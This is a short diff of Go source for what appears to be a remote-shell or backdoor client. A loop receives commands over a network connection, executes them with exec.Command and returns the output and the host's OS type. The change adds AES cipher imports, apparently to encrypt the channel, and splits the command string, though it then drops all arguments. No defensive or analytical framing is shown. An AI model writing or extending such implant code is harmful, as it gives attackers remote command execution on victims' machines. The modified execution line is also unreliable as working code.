@@ -5,6 +5,9 @@ import (
 	"strings"
 	"encoding/gob"
 	"net"
+	"crypto/aes"
+	"crypto/cipher"
+	"io/ioutil"
 	"os/exec"
 	"runtime"
 )
@@ -22,7 +25,6 @@ func main() {
 	}
 
 	cmdLoop:for {
-
 		dec.Decode(&cmd)
 		cmd = strings.TrimSuffix(cmd, "\n")
 	
@@ -35,7 +37,8 @@ func main() {
 			osType := runtime.GOOS
 			enc.Encode(osType)
 		default:
-			out, err := exec.Command(cmd).Output()
+			splitCmd := strings.Split(cmd, " ")
+			out, err := exec.Command(splitCmd[0]).Output()
 		
 			if err != nil {
 				enc.Encode(err)
